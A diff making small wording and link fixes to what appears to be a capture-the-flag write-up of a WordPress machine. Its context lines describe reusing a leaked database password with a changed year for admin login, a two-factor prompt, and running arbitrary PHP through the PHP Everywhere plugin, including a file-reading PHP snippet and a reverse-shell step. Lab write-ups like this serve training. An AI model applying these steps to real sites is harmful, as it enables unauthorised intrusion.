@@ -51,7 +51,7 @@ define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );
 ```
 
 This password can be tried on the _wp-login.php_ login form with the user _admin_.
-The provided password does not work, but by changing the year to 2022, it is valid and forwards to a page on which it wants to validate an **OTP** on the [Two-Factor Authentication application of miniOrange](https://www.miniorange.com/products/two-factor-authentication-(2fa):
+The provided password does not work, but by changing the year to 2022, it is valid and forwards to a page on which it wants to validate an **OTP** on the [Two-Factor Authentication application of miniOrange](https://www.miniorange.com/products/two-factor-authentication-(2fa)):
 
 ![OTP on WordPress](pressed_web-1.png)
 
@@ -122,7 +122,7 @@ URL-decoding the result:
 <?php  echo(file_get_contents('/var/www/html/output.log')); ?>
 ```
 
-This means a post with **PHP Everywhere** code can be created in it to execute arbitrary PHP code.
+This means a post with **PHP Everywhere** can be created to execute arbitrary PHP code.
 
 Creating PHP reverse shell _(shell.php)_
 ```
@@ -167,7 +167,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Getting Shell Access
 
-Unfortunately it is not possible to get a reverse shell as there is a firewall rule implemented:
+Unfortunately it is not possible to get a reverse shell as there are firewall rules implemented:
 ```
 POST /shell.php
 (...)
